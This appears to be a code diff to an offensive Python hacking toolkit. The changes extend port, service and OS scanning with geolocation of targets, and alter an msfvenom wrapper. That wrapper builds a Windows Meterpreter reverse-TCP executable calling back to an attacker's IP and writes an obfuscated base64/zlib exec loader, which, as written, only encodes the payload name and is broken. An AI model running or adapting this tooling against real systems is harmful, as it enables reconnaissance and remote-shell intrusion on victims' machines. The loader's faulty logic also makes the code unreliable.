@@ -1,6 +1,7 @@
 import os
 import subprocess
 import sys
+import GeoIP
 import nmap
 import base64
 import zlib
@@ -8,8 +9,9 @@ import zlib
 
 def scan(ip):
     nm = nmap.PortScanner()
+    gip = GeoIP.new(GeoIP.GEOIP_MEMORY_CACHE)
     print("Scanning...")
-    nm.scan(ip, '1-65535')
+    nm.scan(ip, '1-10000', arguments='-sV -O')
     print(nm.all_hosts())
     for host in nm.all_hosts():
         print('Host : %s (%s)' % (host, nm[host].hostname()))
@@ -17,8 +19,14 @@ def scan(ip):
         for proto in nm[host].all_protocols():
             print('Protocol : %s' % proto)
             lport = nm[host][proto].keys()
-            for port in lport:
-                print('port : %s\tstate : %s' % (port, nm[host][proto][port]['state']))
+            for port in sorted(lport):
+                service = nm[host][proto][port]['name']
+                version = nm[host][proto][port]['version']
+                print('port : %s\tstate : %s\tService : %s\tVersion : %s' % (
+                port, nm[host][proto][port]['state'], service, version))
+        print('OS : %s' % nm[host]['osmatch'][0]['name'])
+        location = gip.record_by_addr(host)
+        print('Location : %s, %s' % (location['city'], location['country_name']))
 
 
 def dirbust():
@@ -44,21 +52,22 @@ def nuclei():
     print("Web server scanning...")
     subprocess.call(['nuclei', '-u', url])
 
+
 def msfvenom():
     print("Creating payload...")
     ip = input("Enter your IP address: ")
     port = input("Enter a port: ")
     payload_name = input("Enter the name of the payload: ")
     payload = 'windows/meterpreter/reverse_tcp'
-    format = 'exe'
+    fformat = 'exe'
     encoded_payload = base64.b64encode(payload.encode('utf-8'))
     compressed_payload = zlib.compress(encoded_payload)
     encoded_compressed_payload = base64.b64encode(compressed_payload)
     payload_code = f"import base64,zlib;exec(zlib.decompress(base64.b64decode('{encoded_compressed_payload.decode()}')))"
-    os.system(f"msfvenom -p {payload} LHOST={ip} LPORT={port} -f {format} > {payload_name}.{format}")
+    os.system(f"msfvenom -p {payload} LHOST={ip} LPORT={port} -f {fformat} > {payload_name}.{fformat}")
     with open(f'{payload_name}.py', 'w') as f:
         f.write(payload_code)
-    print("Payload created: {}.{}".format(payload_name, format))
+    print("Payload created: {}.{}".format(payload_name, fformat))
 
 
 def arp():
